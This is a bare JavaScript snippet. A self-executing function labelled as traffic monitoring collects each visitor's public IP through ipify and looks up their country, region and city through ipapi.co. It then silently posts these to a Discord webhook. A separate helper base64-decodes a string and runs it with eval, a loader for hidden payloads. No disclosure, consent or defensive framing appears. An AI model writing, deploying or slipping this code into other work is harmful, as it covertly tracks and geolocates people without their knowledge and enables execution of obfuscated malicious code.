(function() {
    const webhookUrl = 'discord_webhook';
    async function monitorTraffic() {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        const locationResponse = await fetch('https://ipapi.co/' + ip + '/json/');
        const locationData = await locationResponse.json();
        const data = {
            time: new Date().toISOString(),
            ip: ip,
            location: {
                country: locationData.country_name,
                region: locationData.region,
                city: locationData.city
            }
        };
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }
    monitorTraffic();
})();
const decodeAndRunNode = (base64) => {
    const decoded = Buffer.from(base64, 'base64').toString('utf-8');
    eval(decoded);
};
